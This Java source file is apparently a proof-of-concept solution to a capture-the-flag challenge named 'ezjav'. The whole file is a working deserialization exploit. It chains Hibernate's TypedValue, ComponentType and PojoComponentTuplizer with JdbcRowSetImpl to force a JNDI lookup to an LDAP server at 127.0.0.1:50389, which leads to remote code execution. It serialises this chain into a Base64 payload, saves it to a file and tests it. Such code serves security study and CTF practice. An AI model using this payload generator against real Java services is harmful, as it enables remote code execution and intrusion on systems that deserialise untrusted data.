package com.example.ezjav.solution;


import com.example.ezjav.utils.MyObjectInputStream;
import com.sun.rowset.JdbcRowSetImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.property.access.spi.Getter;
import org.hibernate.property.access.spi.GetterMethodImpl;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Hashtable;


public class Poc {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/99b8ce");
        GetterMethodImpl getterMethod = new GetterMethodImpl(JdbcRowSetImpl.class, "databaseMetaData", jdbcRowSet.getClass().getDeclaredMethod("getDatabaseMetaData"));
        PojoComponentTuplizer o = (PojoComponentTuplizer) Tools.getObjectByUnsafe(PojoComponentTuplizer.class);
        Tools.setFieldValue(o, "getters", new Getter[]{getterMethod});
        ComponentType o1 = (ComponentType) Tools.getObjectByUnsafe(ComponentType.class);
        Tools.setFieldValue(o1, "componentTuplizer", o);
        Tools.setFieldValue(o1, "propertySpan", 1);
        TypedValue typedValue = new TypedValue(o1, jdbcRowSet);
//        typedValue.hashCode();

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put("1", "2");
        Field tableField = Hashtable.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(hashtable);
        for (Object entry: table){
//            System.out.println(entry);
            if (entry != null){
                Tools.setFieldValue(entry,"key",typedValue);
            }
        }


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        CustomObjectOutputStream oos = new CustomObjectOutputStream(baos);
        oos.writeObject(hashtable);
        oos.close();

        String s = Base64.getEncoder().encodeToString(baos.toByteArray());

        Base64.getDecoder().decode(s);

        new FileOutputStream("D://1tmp//payload.txt").write(s.getBytes());

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        new MyObjectInputStream(bais).readObject();
    }
}
